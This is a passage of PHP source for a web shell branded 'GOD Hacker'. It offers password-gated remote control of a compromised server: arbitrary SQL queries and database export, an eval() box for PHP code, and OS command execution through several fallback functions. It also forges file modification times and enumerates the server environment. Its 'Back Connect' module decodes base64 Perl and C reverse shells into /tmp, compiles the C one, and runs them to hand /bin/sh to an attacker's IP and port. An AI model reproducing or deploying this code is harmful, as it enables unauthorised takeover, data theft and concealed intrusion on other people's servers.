			p('<form action="" method="post">');
			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
			makehide('tablename', $tablename);
			makehide('haz','sqladmin');
			p($dbform);
			p('</form>');
			if($tablename || ($runquery && $sql_query)) {
				if($doing == 'structure') {
					$result = q("SHOW COLUMNS FROM $tablename");
					$rowdb = array();
					while($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					p('<table border="0" cellpadding="3" cellspacing="0">');
					p('<tr class="head">');
					p('<td>Field</td>');
					p('<td>Type</td>');
					p('<td>Null</td>');
					p('<td>Key</td>');
					p('<td>Default</td>');
					p('<td>Extra</td>');
					p('</tr>');
					foreach ($rowdb as $row) {
						$thisbg = bg();
						p('<tr class="'.$tbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$tbg.'\';">');
						p('<td>'.$row['Field'].'</td>');
						p('<td>'.$row['Type'].'</td>');
						p('<td>'.$row['Null'].'&nbsp;</td>');
						p('<td>'.$row['Key'].'&nbsp;</td>');
						p('<td>'.$row['Default'].'&nbsp;</td>');
						p('<td>'.$row['Extra'].'&nbsp;</td>');
						p('</tr>');
					}
					tbfoot();
				} elseif($doing == 'insert' || $doing == 'edit') {
					$result = q('SHOW COLUMNS FROM '.$tablename);
					while ($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					$rs = array();
					if($doing == 'insert') {
						p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
					} else {
						p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
						$where = base64_decode($base64);
						$result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
						$rs = mysql_fetch_array($result);
					}
					p('<form method="post" action="'.$self.'">');
					p($dbform);
					makehide('haz','sqladmin');
					makehide('tablename',$tablename);
					p('<table border="0" cellpadding="3" cellspacing="0">');
					foreach ($rowdb as $row) {
						if($rs[$row['Field']]) {
							$value = htmlspecialchars($rs[$row['Field']],ENT_QUOTES);
						} else {
							$value = '';
						}
						$tbg = bg();
						p('<tr class="'.$tbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$tbg.'\';">');
						p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
					}
					if($doing == 'insert') {
						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
					} else {
						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
						makehide('base64', $base64);
					}
					p('</table></form>');
				} else {
					$querys = @explode(';',$sql_query);
					foreach($querys as $num=>$query) {
						if($query) {
							p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
							switch(qy($query)) {
								case 0:
								p('<h2>Error : '.mysql_error().'</h2>');
								break;	
								case 1:
								if(strtolower(substr($query,0,13)) == 'select * from') {
									$allowedit = 1;
								}
								if($getnumsql) {
									$tatol = mysql_num_rows(q($getnumsql));
									$multipage = multi($tatol, $pagenum, $page, $tablename);
								}
								if(!$tablename) {
									$sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
									$sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
									preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
									$tablename = $matches[1][0];
								}
								$result = q($query);
								p($multipage);
								p('<table border="0" cellpadding="3" cellspacing="0">');
								p('<tr class="head">');
								if($allowedit) p('<td>Action</td>');
								$fieldnum = @mysql_num_fields($result);
								for($i=0;$i<$fieldnum;$i++){
									$name = @mysql_field_name($result, $i);
									$type = @mysql_field_type($result, $i);
									$len = @mysql_field_len($result, $i);
									p("<td class=\"nw\">$name<br /><span>$type($len)</span></td>");
								}
								p('</tr>');
								while($mn = @mysql_fetch_assoc($result)){
									$tbg = bg();
									p('<tr class="'.$tbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$tbg.'\';">');
									$where = $tmp = $b1 = '';
									foreach($mn as $key=>$inside){
										if($inside) {
										$where .= $tmp.$key."='".addslashes($inside)."'";
										$tmp = ' AND ';
										}
										$b1 .= '<td class="nw">'.html_clean($inside).'&nbsp;</td>';
									}
									$where = base64_encode($where);
								if($allowedit) p('<td class="nw"><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');
								p($b1);
								p('</tr>');
								unset($b1);
								}
								tbfoot();
								p($multipage);
								break;	
								case 2:
								$ar = mysql_affected_rows();
								p('<h2>affected rows : <b>'.$ar.'</b></h2>');
								break;
							}
						}
					}
				}
			} else {
				$query = q("SHOW TABLE STATUS");
				$table_num = $table_rows = $data_size = 0;
				$tabledb = array();
				while($table = mysql_fetch_array($query)) {
					$data_size = $data_size + $table['Data_length'];
					$table_rows = $table_rows + $table['Rows'];
					$table['Data_length'] = sizecount($table['Data_length']);
					$table_num++;
					$tabledb[] = $table;
				}
				$data_size = sizecount($data_size);
				unset($table);
				p('<table border="0" cellpadding="0" cellspacing="0">');
				p('<form action="'.$self.'" method="post">');
				makehide('haz','sqladmin');
				p($dbform);
				p('<tr class="head">');
				p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
				p('<td>Name</td>');
				p('<td>Rows</td>');
				p('<td>Data_length</td>');
				p('<td>Create_time</td>');
				p('<td>Update_time</td>');
				if($highver) {
				p('<td>Engine</td>');
				p('<td>Collation</td>');
				}
				p('</tr>');
				foreach ($tabledb as $key => $table) {
					$tbg = bg();
					p('<tr class="'.$tbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$tbg.'\';">');
					p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
					p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a> [ <a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a> ]</td>');
					p('<td>'.$table['Rows'].'</td>');
					p('<td>'.$table['Data_length'].'</td>');
					p('<td>'.$table['Create_time'].'</td>');
					p('<td>'.$table['Update_time'].'</td>');
					if($highver) {
					p('<td>'.$table['Engine'].'</td>');
					p('<td>'.$table['Collation'].'</td>');
					}
					p('</tr>');
				}
				p('<tr class="'.bg().'">');
				p('<td>&nbsp;</td>');
				p('<td>Total tables: '.$table_num.'</td>');
				p('<td>'.$table_rows.'</td>');
				p('<td>'.$data_size.'</td>');
				p('<td colspan="'.($highver ? 4 : 2).'">&nbsp;</td>');
				p('</tr>');
				p('<tr class="'.bg().'"><td colspan="'.($highver ? 8 : 6).'"><input name="saveasfile" value="1" type="checkbox" /> Save as file <input class="input" name="path" value="'.F_ROOT.$_SERVER['HTTP_HOST'].'_MySQL.sql" type="text" size="60" /> <input class="bt" type="submit" name="downrar" value="Export selection table" /></td></tr>');
				makehide('doing','backupmysql');
				p("</form>\n</table>");
				fr($query);
			}
		}
	}
	tbfoot();
	mysql_close($lnk);
}
elseif($haz == 'bconx') {
	!$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
	!$yourport && $yourport = '12345';
	$usedb = array('perl'=>'perl','c'=>'c');
$rv_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$rv_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
if($start && $yourip && $yourport && $use){
		if($use == 'perl') {
			sv_file('/tmp/god_bc',@base64_decode($rv_connect));
			$res = mycmd(which('perl')." /tmp/god_bc $yourip $yourport &");
		} else {
			sv_file('/tmp/god_bc.c',@base64_decode($rv_connect_c));
			$res = mycmd('gcc -o /tmp/god_bc /tmp/god_bc.c');
			@unlink('/tmp/god_bc.c');
			$res = mycmd("/tmp/god_bc $yourip $yourport &");
		}
		m("Now script try connect to $yourip port $yourport ...");
	}
	formhead(array('title'=>'Back Connect'));
	makehide('haz','bconx');
	p('<p>');
	p('Your IP:');
	makeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));
	p('Your Port:');
	makeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));
	p('Use:');
	makeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));
	makeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));
	p("</p>\n</form>");
}
elseif($haz=='evl') {
	$phpcode=trim($phpcode);
	if($phpcode){
		if(!strstr($phpcode,'<?')) {$phpcode="<?php\n{$phpcode}\n?>";}
		p('<pre>');
		eval("?".">$phpcode<?");
		echo'</pre>';
	}
	formhead(array('title'=>'Eval PHP Code'));
	makehide('haz','evl');
	maketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));
	formfooter();
}
elseif($haz == 'editfile') {
	if(file_exists($opfile)) {
		$fp=@fopen($opfile,'r');
		$contents=@fread($fp, filesize($opfile));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}
	formhead(array('title'=>'Create / Edit File'));
	makehide('haz','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
	maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));
	formfooter();
}
elseif($haz == 'newtime') {
	$opfilemtime = @filemtime($opfile);
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	formhead(array('title'=>'Clone file was last modified time'));
	makehide('haz','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Alter file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	makeinput(array('title'=>'Reference file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
	formfooter();
	formhead(array('title'=>'Set last modified'));
	makehide('haz','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Current file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	p('<p>Instead &raquo;');
	p('year:');
	makeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));
	p('month:');
	makeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));
	p('day:');
	makeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));
	p('hour:');
	makeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));
	p('minute:');
	makeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));
	p('second:');
	makeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));
	p('</p>');
	formfooter();
}
elseif($haz == 'sh') {
	if(IS_WIN && IS_COM) {
		if($program && $parameter) {
			$shell= new COM('Shell.Application');
			$a = $shell->ShellExecute($program,$parameter);
			m('Program run has '.(!$a ? 'success' : 'fail'));
		}
		!$program && $program = 'c:\windows\system32\cmd.exe';
		!$parameter && $parameter = '/c net start > '.F_ROOT.'log.txt';
		formhead(array('title'=>'Execute Program'));
		makehide('haz','sh');
		makeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));
		p('<p>');
		makeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));
		makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
		p("</p>\n</form>");
	}
	formhead(array('title'=>'Execute Command'));
	makehide('haz','sh');
	if(IS_WIN && IS_COM) {
		$execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');
		makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
	}
	p('<p>');
	makeinput(array('title'=>'Command','name'=>'ex','value'=>$ex));
	makeinput(array('class'=>'bt','type'=>'submit','value'=>'Execute'));
	p("</p>\n</form>");
	if($ex) {
		p('<hr width="100%" noshade><pre>');
		if($execfunc=='wscript' && IS_WIN && IS_COM) {
			$wsh = new COM('WScript.shell');
			$exec = $wsh->exec('cmd.exe /c '.$ex);
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} elseif($execfunc=='proc_open' && IS_WIN && IS_COM) {
			$descriptorspec = array(
			   0 => array('pipe', 'r'),
			   1 => array('pipe', 'w'),
			   2 => array('pipe', 'w')
			);
			$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
			if(is_resource($process)) {
				fwrite($pipes[0], $ex."\r\n");
				fwrite($pipes[0], "exit\r\n");
				fclose($pipes[0]);
				while (!feof($pipes[1])) {
					echo fgets($pipes[1], 1024);
				}
				fclose($pipes[1]);
				while (!feof($pipes[2])) {
					echo fgets($pipes[2], 1024);
				}
				fclose($pipes[2]);
				proc_close($process);
			}
		} else {
			echo(htmlspecialchars(mycmd($ex)));
		}
		p('</pre>');
	}
}
elseif($haz=='env') {
	$upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
	$adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
	$info = array(
		1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),
		2 => array('Server Domain',$_SERVER['SERVER_NAME']),
		3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
		4 => array('Server OS',PHP_OS),
		5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),
		7 => array('Server Web Port',$_SERVER['SERVER_PORT']),
		8 => array('PHP run mode',strtoupper(php_sapi_name())),
		9 => array('The file path',$_SERVER['SCRIPT_FILENAME']),
		10 => array('PHP Version',PHP_VERSION),
		11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:gohaz(\'phpinfo\');">Yes</a>' : 'No')),
		12 => array('Safe Mode',getcfg('safe_mode')),
		13 => array('Administrator',$adminmail),
		14 => array('allow_url_fopen',getcfg('allow_url_fopen')),
		15 => array('enable_dl',getcfg('enable_dl')),
		16 => array('display_errors',getcfg('display_errors')),
		17 => array('register_globals',getcfg('register_globals')),
		18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
		19 => array('Open Basedir',getcfg('open_basedir')),
		20 => array('memory_limit',getcfg('memory_limit')),
		21 => array('post_max_size',getcfg('post_max_size')),
		22 => array('upload_max_filesize',$upsize),
		23 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),
		24 => array('disable_functions',join(' ', nofunc())),
	);
	if($phpvarname) {
		m($phpvarname .' : '.getcfg($phpvarname));
	}
	formhead(array('title'=>'Server environment'));
	makehide('haz','env');
	makeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
	formfooter();
	$hp = array(0=> 'Server', 1=> 'PHP');
	for($a=0;$a<2;$a++) {
		p('<h2>'.$hp[$a].' &raquo;</h2>');
		p('<ul class="info">');
		if($a==0) {
			for($i=1;$i<=9;$i++) {
			p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
			}
		} elseif($a == 1) {
			for($i=10;$i<=24;$i++) {
			p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
			}
		}
		p('</ul>');
	}
}else {
m('Undefined Action');
}
?>

</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
<span style="float:right;"><?php debuginfo();ob_end_flush();?></span> Copyright &copy;2009-<?php echo date('Y');?> <a href="http://god.god/" target="_blank">GOD Hacker</a> All Rights Reserved.
</div>
</body>
</html>
<?php
function m($m,$c='m') {echo "<div class=\"$c\">$m</div>\n";}
function scookie($key, $value, $life = 0, $prefix = 1) {
	global $admin, $timestamp, $_SERVER;
	$key = ($prefix ? $admin['cookiepre'] : '').$key;
	$life = $life ? $life : $admin['cookielife'];
	$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
	setcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);
}	
function multi($num, $perpage, $curpage, $tablename) {
	$multipage = '';
	if($num > $perpage) {
		$page = 10;
		$offset = 5;
		$pages = @ceil($num / $perpage);
		if($page > $pages) {
			$from = 1;
			$to = $pages;
		} else {
			$from = $curpage - $offset;
			$to = $curpage + $page - $offset - 1;
			if($from < 1) {
				$to = $curpage + 1 - $from;
				$from = 1;
				if(($to - $from) < $page && ($to - $from) < $pages) {
					$to = $page;
				}
			} elseif($to > $pages) {
				$from = $curpage - $pages + $to;
				$to = $pages;
				if(($to - $from) < $page && ($to - $from) < $pages) {
					$from = $pages - $page + 1;
				}
			}
		}
		$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
		for($i = $from; $i <= $to; $i++) {
			$multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
		}
		$multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
		$multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
	}
	return $multipage;
}
function loginpage() { ?>

<html><head>
<meta name="robots" content="noindex,nofollow,noarchive">
<style type="text/css">
*{font:11px Verdana;}input {background:#FFF;line-height:18px;border:1px solid #666;}
</style>
</head>
<body>
<form method="post" action="<?php echo $self;?>">
Password: <input name="password" type="password" size="20" value="">
<input type="hidden" name="doing" value="login">
<input type="submit" value="Login">
</form>
</body></html>
<?php exit;
}
function mycmd($c) {
$re='';
	if($c) {
	$pi=array(array('pipe','r'),array('pipe','w'),array('pipe','w'));
	if(isfunc('popen') && @is_resource($f=popen($c.' 2>&1','r'))) {$re.=gres($f);@pclose($f);}
	elseif(isfunc('proc_open') && @is_resource($f=proc_open($c,$pi,$pipes))) {$re.=gres($pipes[1]);$re.=gres($pipes[2]);foreach($pipes as $pp)fclose($pp);@proc_close($f);}
	elseif(isfunc('exec')){exec($c,$re);$re=join("\n",$re);}
	elseif(isfunc('shell_exec')){$re=shell_exec($c);}
	elseif(isfunc('system')) {ob_start();system($c);$re=@ob_get_contents();@ob_end_clean();}
	elseif(isfunc('passthru')){ob_start();passthru($c);$re=@ob_get_contents();@ob_end_clean();}
	}
return $re;
}
function nofunc(){$r=explode(',',@ini_get("disable_functions"));return empty($r)?array():$r;}
function isfunc($f){return (function_exists($f) && is_callable($f) && !in_array($f,nofunc()))?1:0;}
function gres($r){if(!isfunc('stream_get_contents')){while(!feof($r)){$re.=fread($r,4096);}}else{$re.=stream_get_contents($r);}return $re;}
function which($pr){$path = mycmd("which $pr");return ($path ? $path : $pr);}
function sv_file($f,$c) {
	if(function_exists('file_put_contents')) {return @file_put_contents($f,$c);}
	else{
	$r=false;
	if($fp=@fopen($f,'w')){
		@fwrite($fp,$c);
		@fclose($fp);
		$r=true;
	}
	return $r;
	}
}
function debuginfo() {global $starttime;$mtime = explode(' ', microtime());$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);echo 'Processed in '.$totaltime.' second(s)';}
function dbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
	if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
		p('<h2>Can not connect to MySQL server</h2>');
		exit;
	}
	if($link && $dbname) {
		if(!@mysql_select_db($dbname, $link)) {
			p('<h2>Database selected has error</h2>');
			exit;
		}
	}
	if($link && mysql_get_server_info() > '4.1') {
		if(in_array(strtolower($charset), array('latin1', 'utf8'))) {
			q("SET character_set_connection=$charset, character_set_results=$charset, 
character_set_client=binary;", $link);
		}
	}
	return $link;
}
function s_array(&$array) {
	if(is_array($array)) {
		foreach ($array as $k => $v) {
			$array[$k] = s_array($v);
		}
	} else if(is_string($array)) {
		$array = stripslashes($array);
	}
	return $array;
}
function html_clean($content) {
	$content = htmlspecialchars($content, ENT_QUOTES);
	$content = str_replace(array("\n",'  ',"\t"), array("<br />",'&nbsp;&nbsp;','&nbsp;&nbsp;&nbsp;&nbsp;'), $content);
	return $content;
}
function getChmod($filepath){
	return substr(base_convert(@fileperms($filepath),10,8),-4);
}
function getPerms($filepath) {
	$mode = @fileperms($filepath);
	if(($mode & 0xC000) === 0xC000) {$type = 's';}
	elseif(($mode & 0x4000) === 0x4000) {$type = 'd';}
	elseif(($mode & 0xA000) === 0xA000) {$type = 'l';}
	elseif(($mode & 0x8000) === 0x8000) {$type = '-';} 
	elseif(($mode & 0x6000) === 0x6000) {$type = 'b';}
	elseif(($mode & 0x2000) === 0x2000) {$type = 'c';}
	elseif(($mode & 0x1000) === 0x1000) {$type = 'p';}
	else {$type = '?';}
	$owner['read'] = ($mode & 00400) ? 'r' : '-'; 
	$owner['write'] = ($mode & 00200) ? 'w' : '-'; 
	$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
	$group['read'] = ($mode & 00040) ? 'r' : '-'; 
	$group['write'] = ($mode & 00020) ? 'w' : '-'; 
	$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
	$world['read'] = ($mode & 00004) ? 'r' : '-'; 
	$world['write'] = ($mode & 00002) ? 'w' : '-'; 
	$world['execute'] = ($mode & 00001) ? 'x' : '-'; 
	if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}
	return 
$type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].
$world['write'].$world['execute'];
}
function getUser($filepath)	{
	$r='';
	if(isfunc('posix_getpwuid')) {
		$array = @posix_getpwuid(@fileowner($filepath));
		if($array && is_array($array)) {
			$r.= ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
		}
	}
	return $r;
}
function deltree($deldir) {
	$mydir=@dir($deldir);	
	while($file=$mydir->read())	{ 		
		if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) { 
			@chmod($deldir.'/'.$file,0777);
			deltree($deldir.'/'.$file); 
		}
		if(is_file($deldir.'/'.$file)) {
			@chmod($deldir.'/'.$file,0777);
			@unlink($deldir.'/'.$file);
		}
	} 
	$mydir->close(); 
	@chmod($deldir,0777);
	return @rmdir($deldir) ? 1 : 0;
}
function bg() {global $bgc;return ($bgc++%2==0) ? 'alt1' : 'alt2';}
function getPath($scriptpath, $nowpath) {
	if($nowpath == '.') {
		$nowpath = $scriptpath;
	}
	$nowpath = str_replace('\\', '/', $nowpath);
	$nowpath = str_replace('//', '/', $nowpath);
	if(substr($nowpath, -1) != '/') {
		$nowpath = $nowpath.'/';
	}
	return $nowpath;
}
function getUpPath($nowpath) {
	$pathdb = explode('/', $nowpath);
	$num = count($pathdb);
	if($num > 2) {
		unset($pathdb[$num-1],$pathdb[$num-2]);
	}
	$uppath = implode('/', $pathdb).'/';
	$uppath = str_replace('//', '/', $uppath);
	return $uppath;
}
function getcfg($var) {
	$l = @ini_get($var);$i = @get_cfg_var($var);
	$l = $l == 0 ? 'No' : ($l == 1 ? 'Yes' : $l);
	$i = $i == 0 ? 'No' : ($i == 1 ? 'Yes' : $i);
	$r = 'Local value: '.$l.' - INI value: '.$i;
	return $r;
}
function GetList($dir){
global $dirdata,$j,$nowpath;
!$j && $j=1;
if($dh = opendir($dir)) {
	while ($file = readdir($dh)) {
		$f=str_replace('//','/',$dir.'/'.$file);
		if($file!='.' && $file!='..' && is_dir($f)){
			if(is_writable($f)) {
				$dirdata[$j]['filename']=str_replace($nowpath,'',$f);
				$dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
				$dirdata[$j]['dirchmod']=getChmod($f);
				$dirdata[$j]['dirperm']=getPerms($f);
				$dirdata[$j]['dirlink']=ue($dir);
				$dirdata[$j]['server_link']=$f;
				$dirdata[$j]['client_link']=ue($f);
				$j++;
			}
			GetList($f);
		}
	}
	closedir($dh);
	clearstatcache();
	return $dirdata;
	} else {
	return array();
	}
}
function qy($sql) { 
$res = $error = '';
if(!$res = @mysql_query($sql)) { 
	return 0;
	} else if(is_resource($res)) {
	return 1; 
	} else {
	return 2;
	}	
return 0;
}
function q($sql) {return @mysql_query($sql);}
function fr($qy){mysql_free_result($qy);}
function sizecount($size) {
	if($size > 1073741824) {
		$size = round($size / 1073741824 * 100) / 100 . ' G';
	} elseif($size > 1048576) {
		$size = round($size / 1048576 * 100) / 100 . ' M';
	} elseif($size > 1024) {
		$size = round($size / 1024 * 100) / 100 . ' K';
	} else {
		$size = $size . ' B';
	}
	return $size;
}
class PHPZip{
	var $out='';
	function PHPZip($dir)	{
		if(isfunc('gzcompress'))	{
			$curdir = getcwd();
			if(is_array($dir)) $filelist = $dir;
			else{
				$filelist=$this -> GetFileList($dir);
				foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
			}
			if((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
			else chdir($curdir);
			if(count($filelist)>0){
				foreach($filelist as $filename){
					if(is_file($filename)){
						$fd = fopen ($filename, 'r');
						$content = @fread ($fd, filesize($filename));
						fclose ($fd);
						if(is_array($dir)) $filename = basename($filename);
						$this -> addFile($content, $filename);
					}
				}
				$this->out = $this -> file();
				chdir($curdir);
			}
			return 1;
		}
		else return 0;
	}
	function GetFileList($dir){
		static $a;
		if(is_dir($dir)) {
			if($dh = opendir($dir)) {
				while ($file = readdir($dh)) {
					if($file!='.' && $file!='..'){
						$f=$dir .'/'. $file;
						if(is_dir($f)) $this->GetFileList($f);
